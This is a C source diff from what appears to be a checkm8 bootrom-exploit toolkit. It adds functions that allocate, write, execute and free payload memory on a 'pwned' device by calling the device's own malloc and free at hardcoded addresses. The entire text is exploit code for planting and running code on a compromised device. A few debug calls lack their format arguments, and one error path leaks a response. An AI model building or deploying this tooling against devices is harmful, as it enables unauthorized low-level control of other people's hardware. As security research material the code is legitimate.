@@ -15,7 +15,7 @@ struct payload
     const unsigned char *data;
     int len;
 
-    long long install_base;
+    unsigned long long install_base;
     struct payload *next;
     struct payload *prev;
 };
@@ -96,13 +96,25 @@ void free_payload(struct payload *p)
     free(p);
 }
 
-long long curr_address = 0x180150000;
-long long get_address(struct pwned_device *dev, LOCATION_T l)
+unsigned long long get_address(struct pwned_device *dev, LOCATION_T l, int len)
 {
-    //TODO: make an actual memory allocator
-    long long ret = curr_address;
-    curr_address += 0x1000;
-    return ret;
+    checkm8_debug_indent("get_address(dev = %p, loc = %i, len = %i)\n");
+    unsigned long long addr_malloc = 0x10000efe0, retval;
+    unsigned long long malloc_args[2] = {addr_malloc, (unsigned long long) len};
+
+    struct dev_cmd_resp *resp = dev_exec(dev, 0, 2, malloc_args);
+    if(IS_CHECKM8_FAIL(resp->ret))
+    {
+        free_dev_cmd_resp(resp);
+        checkm8_debug_indent("\tfailed to malloc an address\n");
+        return -1;
+    }
+
+    retval = resp->retval;
+    free_dev_cmd_resp(resp);
+
+    checkm8_debug_indent("\tgot address %X\n", retval);
+    return retval;
 }
 
 
@@ -157,7 +169,7 @@ int install_payload(struct pwned_device *dev, PAYLOAD_T p, LOCATION_T loc)
 
     struct dev_cmd_resp *resp = NULL;
     struct payload *pl = get_payload(p);
-    long long addr = get_address(dev, loc);
+    unsigned long long addr = get_address(dev, loc, pl->len);
 
     if(pl == NULL || addr == -1)
     {
@@ -182,7 +194,72 @@ int install_payload(struct pwned_device *dev, PAYLOAD_T p, LOCATION_T loc)
 
 int uninstall_payload(struct pwned_device *dev, PAYLOAD_T p)
 {
-    //TODO: free memory in memory allocator
+    checkm8_debug_indent("uninstall payload(dev = %p, p = %i)\n", dev, p);
+    unsigned long long addr_free = 0x10000f1b0;
+    unsigned long long free_args[2];
+    struct dev_cmd_resp *resp;
+    struct payload *pl = dev_retrieve_payload(dev, p);
+
+    if(pl == NULL)
+    {
+        checkm8_debug_indent("\tinvalid args (payload)\n");
+        return CHECKM8_FAIL_INVARGS;
+    }
+
+    free_args[0] = addr_free;
+    free_args[1] = pl->install_base;
+
+    resp = dev_exec(dev, 0, 2, free_args);
+    if(IS_CHECKM8_FAIL(resp->ret))
+    {
+        free_dev_cmd_resp(resp);
+        checkm8_debug_indent("\tfailed to free allocated payload memory\n");
+        return CHECKM8_FAIL_XFER;
+    }
+
+    dev_unlink_payload(dev, pl);
+    free_payload(pl);
+    return CHECKM8_SUCCESS;
+}
+
+unsigned long long install_data(struct pwned_device *dev, LOCATION_T loc, unsigned char *data, int len)
+{
+    checkm8_debug_indent("install_data(dev = %p, loc = %i, data = %p, len = %i)\n");
+    struct dev_cmd_resp *resp;
+    unsigned long long addr = get_address(dev, loc, len);
+
+    if(addr == -1)
+    {
+        checkm8_debug_indent("\tfailed to get an address\n");
+        return -1;
+    }
+
+    checkm8_debug_indent("\twriting data to address %X\n", addr);
+    resp = dev_write_memory(dev, addr, data, len);
+    if(IS_CHECKM8_FAIL(resp->ret))
+    {
+        checkm8_debug_indent("\tfailed to write data\n");
+        return -1;
+    }
+
+    free_dev_cmd_resp(resp);
+    return addr;
+}
+
+int uninstall_data(struct pwned_device *dev, unsigned long long addr)
+{
+    checkm8_debug_indent("uninstall_data(dev = %p, addr = %X)\n", dev, addr);
+    struct dev_cmd_resp *resp;
+    unsigned long long addr_free = 0x10000f1b0;
+    unsigned long long free_args[2] = {addr_free, addr};
+
+    resp = dev_exec(dev, 0, 2, free_args);
+    if(IS_CHECKM8_FAIL(resp->ret))
+    {
+        checkm8_debug_indent("failed to free memory at %x\n", addr);
+        return CHECKM8_FAIL_XFER;
+    }
+
     return CHECKM8_SUCCESS;
 }
 
@@ -217,19 +294,19 @@ struct dev_cmd_resp *execute_payload(struct pwned_device *dev, PAYLOAD_T p, int 
     return dev_exec(dev, response_len, nargs + 1, args);
 }
 
-struct dev_cmd_resp *read_gadget(struct pwned_device *dev, long long addr, int len)
+struct dev_cmd_resp *read_gadget(struct pwned_device *dev, unsigned long long addr, int len)
 {
     checkm8_debug_indent("read_gadget(dev = %p, addr = %lx, len = %i)\n", dev, addr, len);
     return dev_read_memory(dev, addr, len);
 }
 
-struct dev_cmd_resp *write_gadget(struct pwned_device *dev, long long addr, unsigned char *data, int len)
+struct dev_cmd_resp *write_gadget(struct pwned_device *dev, unsigned long long addr, unsigned char *data, int len)
 {
     checkm8_debug_indent("write_gadget(dev = %p, addr = %lx, data = %p, len = %i)\n", dev, addr, data, len);
     return dev_write_memory(dev, addr, data, len);
 }
 
-struct dev_cmd_resp *execute_gadget(struct pwned_device *dev, long long addr, int response_len, int nargs, ...)
+struct dev_cmd_resp *execute_gadget(struct pwned_device *dev, unsigned long long addr, int response_len, int nargs, ...)
 {
     checkm8_debug_indent("execute_gadget(dev = %p, addr = %lx, nargs = %i)\n", dev, addr, nargs);
     int i;
